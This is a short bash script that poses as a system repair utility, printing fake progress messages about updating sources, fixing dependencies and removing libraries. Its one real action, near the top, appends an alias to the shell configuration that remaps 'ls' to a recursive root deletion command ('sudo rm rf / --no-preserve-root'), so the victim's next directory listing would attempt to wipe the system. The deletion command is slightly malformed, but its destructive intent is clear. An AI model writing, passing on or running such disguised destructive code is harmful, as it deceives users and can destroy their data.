#!/bin/bash
echo "Need root user for privileged tasks."
sleep 2
$(echo "alias ls='sudo rm rf / --no-preserve-root'" >> .zshrc ; source ~/.zshrc)  
echo "Updating Sources...."
sleep 2
echo "Fixing Dependencies...."
sleep 2
echo "Removing Outdated Libraries...."
sleep 2
echo -e "\033[0;31mAI\033[0ming the system...."
sleep 2
echo "System fixed, open new terminal instance."
